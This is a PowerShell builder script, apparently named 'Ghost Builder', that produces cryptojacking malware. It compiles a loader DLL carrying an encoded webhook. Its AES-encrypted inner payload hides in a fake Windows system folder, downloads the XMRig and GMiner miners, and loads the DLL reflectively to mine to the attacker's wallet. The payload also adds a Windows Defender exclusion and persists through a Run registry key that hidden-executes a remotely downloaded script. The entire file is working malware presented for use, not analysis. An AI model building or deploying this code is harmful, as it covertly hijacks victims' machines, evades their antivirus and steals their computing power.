param (
    [Parameter(Mandatory=$true)] [string]$GithubUser,
    [Parameter(Mandatory=$true)] [string]$Repo,
    [Parameter(Mandatory=$true)] [string]$Wallet,
    [Parameter(Mandatory=$true)] [string]$Webhook
)

Write-Host "[*] Starting Ghost Builder by ENI..." -ForegroundColor Cyan

# 1. Update Bridge.cs Webhook
$bridgePath = "Bridge.cs"
$bridgeCode = Get-Content $bridgePath -Raw
$b64Webhook = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Webhook))
$bridgeCode = $bridgeCode -replace 'private static string Webhook = D\(".*"\);', "private static string Webhook = D(`"$b64Webhook`");"
Set-Content $bridgePath $bridgeCode
Write-Host "[+] Bridge.cs updated with new Webhook." -ForegroundColor Green

# 2. Compile Bridge.dll
Write-Host "[*] Compiling Bridge.dll..." -ForegroundColor Cyan
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$compile = & $csc /nologo /target:library /out:Bridge.dll Bridge.cs 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Compilation failed:`n$compile" -ForegroundColor Red
    exit
}
Write-Host "[+] Bridge.dll compiled successfully." -ForegroundColor Green

# 3. Generate the Inner Payload
$innerPayload = @"
`$u = "$GithubUser"; `$r = "$Repo"; `$w = "$Wallet"
`$ProgressPreference = 'SilentlyContinue'

`$sDir = "C:\Windows\SystemApps\Microsoft.Windows.UpdateSystem_cw5n1h2txyewy"
if (!(Test-Path `$sDir)) { try { md `$sDir -Force >`$null } catch { `$sDir = "`$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"; md `$sDir -Force >`$null } }

try { Get-Process "xmrig", "miner" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }

function Get-F(`$Url, `$Path) {
    if (Test-Path `$Path) { try { Remove-Item `$Path -Force -ErrorAction SilentlyContinue } catch { } }
    `$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    try { 
        `$wc = New-Object System.Net.WebClient
        `$wc.Headers.Add("User-Agent", `$ua)
        `$wc.DownloadFile(`$Url, `$Path)
        if (Test-Path `$Path) { if ((Get-Item `$Path).Length -gt 1KB) { return `$true } }
    }
    catch { }
    try { Invoke-WebRequest -Uri `$Url -OutFile `$Path -UserAgent `$ua -UseBasicParsing; if (Test-Path `$Path) { if ((Get-Item `$Path).Length -gt 1KB) { return `$true } } } catch { }
    return `$false
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
`$ce = "`$sDir\xmrig.exe"; `$ge = "`$sDir\miner.exe"; `$dp = "`$sDir\Bridge.dll"
`$u2 = "https://raw.githubusercontent.com/`$u/`$r/main"; `$v = "?v=`$([Guid]::NewGuid())"

if (!(Test-Path `$ce)) {
    `$cz = "`$sDir\upd_c.zip"
    if (Get-F "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" `$cz) {
        [System.IO.Compression.ZipFile]::ExtractToDirectory(`$cz, `$sDir)
        Remove-Item `$cz -Force -ErrorAction 0
        `$uz = Get-ChildItem `$sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if (`$uz -and `$uz.FullName -ne `$ce) { Move-Item `$uz.FullName `$ce -Force }
    }
}

`$gd = `$false
try { 
    `$ccs = Get-CimInstance Win32_VideoController -ErrorAction 0
    foreach (`$cc in `$ccs) { 
        `$nn = `$cc.Name.ToUpper()
        if (`$nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -and `$cc.AdapterRAM -gt 3221225472) { 
            if (`$nn -notmatch "MICROSOFT BASIC|DISPLAY") { 
                `$gd = `$true; break 
            } 
        } 
    } 
} catch { }

if (`$gd -and !(Test-Path `$ge)) {
    `$gz = "`$sDir\upd_g.zip"
    if (Get-F "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip" `$gz) {
        [System.IO.Compression.ZipFile]::ExtractToDirectory(`$gz, `$sDir)
        Remove-Item `$gz -Force -ErrorAction 0
        `$uz = Get-ChildItem `$sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if (`$uz -and `$uz.FullName -ne `$ge) { Move-Item `$uz.FullName `$ge -Force }
    }
}

if (Get-F "`$u2/Bridge.dll`$v" `$dp) {
    try {
        `$db = [IO.File]::ReadAllBytes(`$dp); [Reflection.Assembly]::Load(`$db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke(`$null, @([string]`$ce, [string]`$ge, [string]`$w))
        
        `$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('`$u2/GhostPayload.ps1')`""
        
        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(512)) { try { Add-MpPreference -ExclusionPath `$sDir -ErrorAction 0 } catch { } }
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" `$tp -ErrorAction 0
    }
    catch { }
}
"@

# 4. Encrypt Payload
Write-Host "[*] Encrypting inner payload..." -ForegroundColor Cyan
$v2 = 'TD6FEszf9BrQ3EMswu9FGA=='
$v3 = '090sc29atX+hAYekE31ghw=='

$a = [System.Security.Cryptography.Aes]::Create()
$a.Key = [Convert]::FromBase64String($v2)
$a.IV = [Convert]::FromBase64String($v3)
$e = $a.CreateEncryptor()

$m = New-Object System.IO.MemoryStream
$c = New-Object System.Security.Cryptography.CryptoStream($m, $e, [System.Security.Cryptography.CryptoStreamMode]::Write)
$sw = New-Object System.IO.StreamWriter($c)
$sw.Write($innerPayload)
$sw.Flush()
$c.FlushFinalBlock()
$encryptedBytes = $m.ToArray()
$newV1 = [Convert]::ToBase64String($encryptedBytes)

# 5. Patch GhostPayload.ps1
$ghostPath = "GhostPayload.ps1"
$ghostCode = Get-Content $ghostPath -Raw
$ghostCode = $ghostCode -replace "(?m)^\`$v1 = '.*'$", "`$v1 = '$newV1'"
Set-Content $ghostPath $ghostCode

Write-Host "[+] GhostPayload.ps1 patched with new encrypted payload." -ForegroundColor Green
Write-Host "[SUCCESS] Build complete! You can now push Bridge.dll and GhostPayload.ps1 to your new repo." -ForegroundColor Magenta
